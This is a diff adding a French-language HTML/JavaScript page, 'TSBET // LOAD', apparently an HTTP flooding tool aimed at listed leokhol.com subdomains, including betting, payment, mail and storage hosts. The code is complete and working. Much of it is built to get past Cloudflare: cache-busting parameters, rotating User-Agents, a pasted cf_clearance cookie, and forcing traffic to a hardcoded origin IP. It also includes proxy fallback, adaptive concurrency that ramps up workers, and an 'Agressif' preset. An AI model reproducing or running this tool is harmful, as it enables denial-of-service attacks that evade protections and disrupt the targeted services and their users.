@@ -1,0 +1,482 @@
+<!doctype html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>TSBET // LOAD</title>
+<style>
+:root{--bg:#0a0c10;--p:#11141b;--b:#1e2430;--t:#c8d2e0;--d:#5d6b80;--a:#31e08b;--r:#ff5470}
+*{box-sizing:border-box}
+html,body{margin:0;height:100%}
+body{background:var(--bg);color:var(--t);font:13px/1.55 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;-webkit-font-smoothing:antialiased}
+h1{font-size:15px;margin:0;letter-spacing:.14em}
+h1 span{color:var(--d)}
+header{display:flex;align-items:center;gap:10px;padding:12px 16px;border-bottom:1px solid var(--b);position:sticky;top:0;background:var(--bg);z-index:5;flex-wrap:wrap}
+.sp{flex:1}
+button{font:inherit;background:var(--p);color:var(--t);border:1px solid var(--b);padding:7px 14px;border-radius:6px;cursor:pointer;transition:.12s}
+button:hover:not(:disabled){border-color:#3b4657;background:#171c25}
+button:disabled{opacity:.35;cursor:not-allowed}
+button.go{background:#0f2a1e;border-color:#1d5c3d;color:var(--a)}
+button.go:hover:not(:disabled){background:#143a29}
+button.stop{background:#2a1018;border-color:#6b2338;color:var(--r)}
+.pill{padding:4px 10px;border-radius:999px;border:1px solid var(--b);color:var(--d);font-size:11px;letter-spacing:.1em}
+.pill.run{color:var(--a);border-color:#1d5c3d;background:#0f2a1e}
+main{display:grid;grid-template-columns:400px 1fr;gap:12px;padding:12px;align-items:start}
+@media(max-width:1000px){main{grid-template-columns:1fr}}
+.panel{background:var(--p);border:1px solid var(--b);border-radius:8px;padding:12px}
+.panel h2{font-size:11px;letter-spacing:.14em;color:var(--d);margin:0 0 10px;text-transform:uppercase;font-weight:500}
+label{display:block;font-size:11px;color:var(--d);margin:9px 0 4px;letter-spacing:.05em}
+input,select,textarea{width:100%;background:#0a0c10;color:var(--t);border:1px solid var(--b);border-radius:5px;padding:6px 8px;font:inherit}
+input:focus,textarea:focus,select:focus{outline:none;border-color:#3b4657}
+textarea{resize:vertical;min-height:64px}
+.row{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.row3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}
+.chk{display:flex;align-items:center;gap:7px;margin-top:9px;font-size:11.5px;color:var(--t);cursor:pointer}
+.chk input{width:auto;accent-color:var(--a)}
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:8px}
+.kpi{background:#0a0c10;border:1px solid var(--b);border-radius:6px;padding:8px 10px}
+.kpi b{display:block;font-size:19px;line-height:1.2;font-variant-numeric:tabular-nums}
+.kpi i{font-style:normal;font-size:10px;color:var(--d);letter-spacing:.1em;text-transform:uppercase}
+canvas{width:100%;height:120px;display:block;background:#0a0c10;border:1px solid var(--b);border-radius:6px;margin-top:10px}
+table{width:100%;border-collapse:collapse;font-size:11.5px;margin-top:8px}
+td{padding:2px 4px;border-bottom:1px solid #14181f}
+td:last-child{text-align:right;color:var(--d)}
+#log{height:150px;overflow:auto;background:#0a0c10;border:1px solid var(--b);border-radius:6px;padding:8px;margin-top:10px;font-size:11px;color:var(--d);white-space:pre-wrap}
+#log .e{color:var(--r)}
+#log .o{color:var(--a)}
+details{margin-top:10px;border-top:1px solid var(--b);padding-top:8px}
+summary{cursor:pointer;font-size:11px;color:var(--d);letter-spacing:.08em}
+.half{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+</style>
+</head>
+<body>
+<header>
+  <h1>TSBET<span>//LOAD</span></h1>
+  <div class="pill" id="pill">IDLE</div>
+  <div class="sp"></div>
+  <button id="start" class="go">DEMARRER</button>
+  <button id="stop" class="stop" disabled>STOP</button>
+</header>
+
+<main>
+  <section class="panel">
+    <h2>Cible</h2>
+    <label>Hote principal</label>
+    <select id="host">
+      <option>tsbet.leokhol.com</option>
+      <option>tsapi.leokhol.com</option>
+      <option>ts1store.leokhol.com</option>
+      <option>tsstore.leokhol.com</option>
+      <option>tsanalytics.leokhol.com</option>
+      <option>rbxstoreapi.leokhol.com</option>
+      <option>rbx.leokhol.com</option>
+      <option>lkbot.leokhol.com</option>
+      <option>gbot.leokhol.com</option>
+      <option>workers.leokhol.com</option>
+      <option>analytics.leokhol.com</option>
+      <option>posthog.leokhol.com</option>
+      <option>cdn.leokhol.com</option>
+      <option>mail.leokhol.com</option>
+      <option>vps.leokhol.com</option>
+      <option>btcpay.leokhol.com</option>
+      <option>s3-console.leokhol.com</option>
+      <option>proxy.leokhol.com</option>
+      <option>webhook-proxy.leokhol.com</option>
+      <option>www.leokhol.com</option>
+    </select>
+    <label class="chk"><input type="checkbox" id="rotate"> Rotation sur tous les hotes</label>
+    <textarea id="targets" style="margin-top:6px;min-height:56px;display:none"></textarea>
+
+    <label>Chemins (un par ligne, "chemin | poids")</label>
+    <textarea id="paths" spellcheck="false">/api/system/maintenance
+/api/health
+/api/status
+/api/live-bets?tab=all
+/api/fairness/seeds
+/api/leaderboard
+/api/chat
+/ | 2
+/auth/login | 2</textarea>
+
+    <div class="row">
+      <div><label>Methode</label>
+        <select id="method"><option>GET</option><option>HEAD</option><option>POST</option></select></div>
+      <div><label>Mode</label>
+        <select id="mode">
+          <option value="auto">Auto</option>
+          <option value="direct">Direct (CORS)</option>
+          <option value="nocors">Direct (no-cors)</option>
+          <option value="proxy">Proxy Edge</option>
+        </select></div>
+    </div>
+
+    <label>Corps (POST)</label>
+    <textarea id="body" spellcheck="false" style="min-height:48px">{"betAmount":10,"prediction":"over","target":50,"serviceId":"ts15"}</textarea>
+
+    <div class="row3">
+      <div><label>Concurrence</label><input id="conc" type="number" value="80" min="1" max="400"></div>
+      <div><label>Duree (s)</label><input id="dur" type="number" value="60" min="1" max="3600"></div>
+      <div><label>Cap req/s</label><input id="cap" type="number" value="0" min="0"></div>
+    </div>
+
+    <label class="chk"><input type="checkbox" id="bust" checked> Cache-buster (bypass cache CF)</label>
+    <label class="chk"><input type="checkbox" id="rotateUa" checked> Rotation User-Agent</label>
+    <label class="chk"><input type="checkbox" id="adaptive" checked> Concurrence adaptative</label>
+
+    <details>
+      <summary>Avance</summary>
+      <label>Cookie (cf_clearance / session)</label>
+      <textarea id="cookie" spellcheck="false" style="min-height:56px" placeholder="cf_clearance=...; __Secure-ts15.session_token=..."></textarea>
+      <label class="chk"><input type="checkbox" id="forceOrigin"> Forcer l origine (bypass Cloudflare)</label>
+      <label>IP origine</label>
+      <input id="originIp" value="141.95.127.213">
+      <label>Timeout (ms)</label>
+      <input id="timeout" type="number" value="8000" min="500" max="20000">
+    </details>
+
+    <div class="row" style="margin-top:10px">
+      <button data-preset="20,30">Leger</button>
+      <button data-preset="80,60">Moyen</button>
+      <button data-preset="200,120">Agressif</button>
+    </div>
+  </section>
+
+  <section class="panel">
+    <h2>Mesures</h2>
+    <div class="grid">
+      <div class="kpi"><i>Total</i><b id="s-total">0</b></div>
+      <div class="kpi"><i>Req/s</i><b id="s-rps">0</b></div>
+      <div class="kpi"><i>Succes</i><b id="s-ok">0%</b></div>
+      <div class="kpi"><i>Erreurs</i><b id="s-fail">0</b></div>
+      <div class="kpi"><i>p50</i><b id="s-p50">0</b></div>
+      <div class="kpi"><i>p95</i><b id="s-p95">0</b></div>
+      <div class="kpi"><i>p99</i><b id="s-p99">0</b></div>
+      <div class="kpi"><i>Mo recus</i><b id="s-mb">0</b></div>
+    </div>
+    <canvas id="chart"></canvas>
+    <div class="half">
+      <div><h2 style="margin-top:10px">Codes</h2><table id="t-codes"></table></div>
+      <div><h2 style="margin-top:10px">Chemins</h2><table id="t-paths"></table></div>
+    </div>
+    <div id="log"></div>
+  </section>
+</main>
+
+<script>
+'use strict';
+const $ = s => document.querySelector(s);
+const clamp = (v,a,b) => Math.min(b, Math.max(a, v));
+const lines = s => s.split('\n').map(x=>x.trim()).filter(Boolean);
+
+const UAS = [
+ 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36',
+ 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15',
+ 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36',
+ 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0',
+ 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Mobile/15E148 Safari/604.1',
+ 'Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Mobile Safari/537.36'
+];
+
+const state = {
+  running:false, endsAt:0, mode:'direct', t0:0,
+  targetWorkers:0, alive:0, total:0, ok:0, fail:0, bytes:0,
+  codes:Object.create(null), paths:Object.create(null),
+  lat:[], series:[], nextSlot:0, tick:null, adapt:null, guard:null, cfg:null
+};
+
+const fmt = n => Math.round(n).toLocaleString('fr-FR');
+const pick = a => a[(Math.random()*a.length)|0];
+
+function log(msg, cls) {
+  const el = $('#log');
+  const d = document.createElement('div');
+  if (cls) d.className = cls;
+  d.textContent = '[' + new Date().toLocaleTimeString('fr-FR') + '] ' + msg;
+  el.appendChild(d);
+  while (el.childElementCount > 250) el.removeChild(el.firstChild);
+  el.scrollTop = el.scrollHeight;
+}
+
+function weighted(list) {
+  const items = [], weights = [];
+  for (const raw of list) {
+    const parts = raw.split('|').map(x=>x.trim());
+    items.push(parts[0]); weights.push(Math.max(1, parseInt(parts[1],10) || 1));
+  }
+  const total = weights.reduce((a,b)=>a+b,0);
+  let r = Math.random() * total;
+  for (let i=0;i<items.length;i++){ r -= weights[i]; if (r <= 0) return items[i]; }
+  return items[items.length-1];
+}
+
+function makeUrl(cfg, host, path) {
+  let u = /^https?:\/\//.test(path) ? path : 'https://' + host + (path.startsWith('/') ? path : '/' + path);
+  if (cfg.bust) u += (u.includes('?') ? '&' : '?') + '_=' + Date.now() + Math.random().toString(36).slice(2,8);
+  return u;
+}
+
+function proxyUrl(cfg, url) {
+  let p = '/api/proxy?url=' + encodeURIComponent(url);
+  if (cfg.forceOrigin && cfg.originIp) p += '&ip=' + encodeURIComponent(cfg.originIp);
+  return p;
+}
+
+function record(ok, code, ms, bytes, path) {
+  state.total++;
+  ok ? state.ok++ : state.fail++;
+  state.bytes += bytes || 0;
+  const k = String(code);
+  state.codes[k] = (state.codes[k] || 0) + 1;
+  state.paths[path] = (state.paths[path] || 0) + 1;
+  state.lat.push(ms);
+  if (state.lat.length > 5000) state.lat.shift();
+}
+
+function pctl(p) {
+  if (!state.lat.length) return 0;
+  const s = [...state.lat].sort((a,b)=>a-b);
+  return s[clamp(Math.ceil(s.length * p) - 1, 0, s.length - 1)] || 0;
+}
+
+function slot(cap) {
+  const now = performance.now(), gap = 1000 / cap;
+  state.nextSlot = Math.max(state.nextSlot, now) + gap;
+  const w = state.nextSlot - now;
+  return w > 0 ? new Promise(r => setTimeout(r, w)) : Promise.resolve();
+}
+
+async function worker(cfg) {
+  try {
+    while (state.running && Date.now() < state.endsAt) {
+      if (state.alive > state.targetWorkers) return;
+      if (cfg.cap > 0) await slot(cfg.cap);
+
+      const host = cfg.rotate ? pick(cfg.targets) : cfg.targets[0];
+      const path = weighted(cfg.paths);
+      const url = makeUrl(cfg, host, path);
+      const viaProxy = state.mode === 'proxy';
+      const finalUrl = viaProxy ? proxyUrl(cfg, url) : url;
+
+      const opts = { cache: 'no-store', redirect: 'follow' };
+      const h = {};
+      if (cfg.rotateUa) h['user-agent'] = pick(UAS);
+      if (cfg.cookie) h['cookie'] = cfg.cookie;
+      if (cfg.method === 'POST' && cfg.body) h['content-type'] = 'application/json';
+      opts.headers = h;
+      opts.method = cfg.method;
+      if (cfg.method === 'POST' && cfg.body) opts.body = cfg.body;
+      if (!viaProxy && state.mode === 'nocors') opts.mode = 'no-cors';
+      else opts.mode = 'cors';
+      if (cfg.timeout && window.AbortSignal && AbortSignal.timeout) opts.signal = AbortSignal.timeout(cfg.timeout);
+
+      const t0 = performance.now();
+      let ok = false, code = 0, bytes = 0;
+      try {
+        const r = await fetch(finalUrl, opts);
+        const ms = performance.now() - t0;
+        if (state.mode === 'nocors') { ok = true; code = -1; }
+        else {
+          code = r.status;
+          ok = r.status < 500;
+          try { const b = await r.arrayBuffer(); bytes = b.byteLength; } catch (e) {}
+        }
+        record(ok, code, ms, bytes, path);
+      } catch (e) {
+        record(false, 0, performance.now() - t0, 0, path);
+      }
+
+      if (state.mode === 'direct' && state.ok === 0 && state.fail >= 25) {
+        state.mode = 'proxy';
+        log('CORS direct bloque -> bascule proxy', 'e');
+      }
+    }
+  } finally { state.alive--; }
+}
+
+function spawn(cfg) { state.alive++; worker(cfg); }
+
+function render() {
+  const el = performance.now() - state.t0;
+  const rps = el > 500 ? state.total / (el / 1000) : 0;
+  $('#s-total').textContent = fmt(state.total);
+  $('#s-rps').textContent = fmt(rps);
+  $('#s-ok').textContent = state.total ? Math.round(state.ok / state.total * 100) + '%' : '0%';
+  $('#s-fail').textContent = fmt(state.fail);
+  $('#s-p50').textContent = Math.round(pctl(.5));
+  $('#s-p95').textContent = Math.round(pctl(.95));
+  $('#s-p99').textContent = Math.round(pctl(.99));
+  $('#s-mb').textContent = (state.bytes / 1048576).toFixed(2);
+
+  const tc = $('#t-codes'); tc.innerHTML = '';
+  Object.entries(state.codes).sort((a,b)=>b[1]-a[1]).slice(0,6).forEach(function(e) {
+    const k = e[0], v = e[1];
+    tc.insertAdjacentHTML('beforeend', '<tr><td>' + (k === '0' ? 'reseau' : k === '-1' ? 'envoye' : k) + '</td><td>' + fmt(v) + '</td></tr>');
+  });
+  const tp = $('#t-paths'); tp.innerHTML = '';
+  Object.entries(state.paths).sort((a,b)=>b[1]-a[1]).slice(0,6).forEach(function(e) {
+    const k = e[0], v = e[1];
+    tp.insertAdjacentHTML('beforeend', '<tr><td>' + (k.length > 30 ? k.slice(0,30) + '...' : k) + '</td><td>' + fmt(v) + '</td></tr>');
+  });
+
+  state.series.push({ rps: rps, err: state.total ? state.fail / state.total : 0 });
+  if (state.series.length > 120) state.series.shift();
+  draw();
+}
+
+function draw() {
+  const cv = $('#chart');
+  const w = cv.clientWidth, hgt = cv.clientHeight, dpr = devicePixelRatio || 1;
+  if (cv.width !== w * dpr) { cv.width = w * dpr; cv.height = hgt * dpr; }
+  const c = cv.getContext('2d');
+  c.setTransform(dpr,0,0,dpr,0,0);
+  c.clearRect(0,0,w,hgt);
+  const max = Math.max(1, Math.max.apply(null, state.series.map(s=>s.rps).concat([1])));
+  const bw = w / Math.max(120, state.series.length);
+  state.series.forEach(function(s,i) {
+    const bh = (s.rps / max) * (hgt - 6);
+    c.fillStyle = s.err > .3 ? '#ff5470' : '#31e08b';
+    c.globalAlpha = .75;
+    c.fillRect(i * bw, hgt - bh, Math.max(1, bw - .5), bh);
+  });
+  c.globalAlpha = 1;
+}
+
+function readCfg() {
+  const targets = lines($('#targets').value);
+  const rotate = $('#rotate').checked && targets.length > 0;
+  return {
+    targets: rotate ? targets : [$('#host').value.trim()],
+    rotate: rotate,
+    paths: lines($('#paths').value),
+    method: $('#method').value,
+    body: $('#body').value.trim(),
+    mode: $('#mode').value,
+    conc: clamp(+$('#conc').value || 1, 1, 400),
+    dur: clamp(+$('#dur').value || 10, 1, 3600),
+    cap: Math.max(0, +$('#cap').value || 0),
+    timeout: clamp(+$('#timeout').value || 8000, 500, 20000),
+    cookie: $('#cookie').value.trim(),
+    originIp: $('#originIp').value.trim(),
+    forceOrigin: $('#forceOrigin').checked,
+    bust: $('#bust').checked,
+    rotateUa: $('#rotateUa').checked,
+    adaptive: $('#adaptive').checked
+  };
+}
+
+async function detect(cfg) {
+  if (cfg.mode === 'nocors' || cfg.mode === 'proxy') return cfg.mode;
+  if (cfg.forceOrigin) { log('origine forcee -> proxy'); return 'proxy'; }
+  if (cfg.mode === 'direct') return 'direct';
+  try {
+    const ctl = new AbortController();
+    setTimeout(function(){ ctl.abort(); }, 6000);
+    await fetch(makeUrl({ targets: cfg.targets, bust: true }, cfg.targets[0], cfg.paths[0]),
+      { mode: 'cors', cache: 'no-store', signal: ctl.signal });
+    log('CORS direct disponible', 'o');
+    return 'direct';
+  } catch (e) {
+    log('CORS direct bloque -> proxy', 'e');
+    return 'proxy';
+  }
+}
+
+async function start() {
+  const cfg = readCfg();
+  if (!cfg.targets.length || !cfg.paths.length) return log('cible ou chemins manquants', 'e');
+  state.cfg = cfg;
+  state.running = true;
+  state.total = state.ok = state.fail = state.bytes = 0;
+  state.codes = Object.create(null);
+  state.paths = Object.create(null);
+  state.lat = [];
+  state.series = [];
+  state.nextSlot = 0;
+  state.t0 = performance.now();
+  state.endsAt = Date.now() + cfg.dur * 1000;
+  state.targetWorkers = cfg.conc;
+  state.alive = 0;
+
+  $('#start').disabled = true;
+  $('#stop').disabled = false;
+  $('#pill').className = 'pill run';
+  $('#pill').textContent = 'RUN';
+
+  state.mode = await detect(cfg);
+  $('#pill').textContent = 'RUN ' + state.mode.toUpperCase();
+  log('demarrage - ' + cfg.conc + ' workers - ' + cfg.dur + 's - mode ' + state.mode);
+
+  for (let i = 0; i < cfg.conc; i++) spawn(cfg);
+
+  state.tick = setInterval(render, 500);
+  state.guard = setTimeout(stop, cfg.dur * 1000 + 1500);
+
+  if (cfg.adaptive) {
+    state.adapt = setInterval(function() {
+      if (!state.running) return;
+      const rate = state.total ? state.fail / state.total : 0;
+      if (rate > .25 && state.targetWorkers > 4) {
+        state.targetWorkers = Math.max(4, Math.round(state.targetWorkers * .75));
+      } else if (rate < .03 && state.targetWorkers < cfg.conc * 2) {
+        const add = Math.ceil(state.targetWorkers * .2);
+        state.targetWorkers += add;
+        for (let i = 0; i < add; i++) spawn(cfg);
+      }
+    }, 2000);
+  }
+}
+
+function stop() {
+  if (!state.running) return;
+  state.running = false;
+  clearInterval(state.tick); clearInterval(state.adapt); clearTimeout(state.guard);
+  const el = (performance.now() - state.t0) / 1000;
+  log('ARRET - ' + fmt(state.total) + ' req - ' + (state.total / Math.max(.001, el)).toFixed(0) + ' req/s - ' + fmt(state.fail) + ' erreurs - ' + (state.bytes/1048576).toFixed(2) + ' Mo', 'o');
+  $('#start').disabled = false;
+  $('#stop').disabled = true;
+  $('#pill').className = 'pill';
+  $('#pill').textContent = 'IDLE';
+}
+
+$('#rotate').addEventListener('change', function(e) {
+  $('#targets').style.display = e.target.checked ? 'block' : 'none';
+  if (e.target.checked && !$('#targets').value) {
+    $('#targets').value = Array.prototype.map.call($('#host').options, function(o){ return o.value; }).join('\n');
+  }
+});
+$('#method').addEventListener('change', function(e) { $('#body').disabled = e.target.value !== 'POST'; });
+Array.prototype.forEach.call(document.querySelectorAll('[data-preset]'), function(b) {
+  b.addEventListener('click', function() {
+    const p = b.dataset.preset.split(',');
+    $('#conc').value = p[0]; $('#dur').value = p[1];
+  });
+});
+$('#start').addEventListener('click', start);
+$('#stop').addEventListener('click', stop);
+
+const SAVE = ['host','paths','method','mode','body','conc','dur','cap','timeout','cookie','originIp','bust','rotateUa','adaptive','forceOrigin','rotate','targets'];
+function persist() {
+  const o = {};
+  for (const k of SAVE) {
+    const el = document.getElementById(k);
+    o[k] = el.type === 'checkbox' ? el.checked : el.value;
+  }
+  try { localStorage.setItem('tsb_cfg', JSON.stringify(o)); } catch (e) {}
+}
+function restore() {
+  try {
+    const o = JSON.parse(localStorage.getItem('tsb_cfg') || '{}');
+    for (const k of SAVE) {
+      if (o[k] === undefined) continue;
+      const el = document.getElementById(k);
+      if (el.type === 'checkbox') el.checked = o[k]; else el.value = o[k];
+    }
+    if ($('#rotate').checked) $('#targets').style.display = 'block';
+  } catch (e) {}
+}
+SAVE.forEach(function(k){ document.getElementById(k).addEventListener('change', persist); });
+restore();
+log('pret - colle ton cookie cf_clearance pour eviter le challenge');
+</script>
+</body>
+</html>
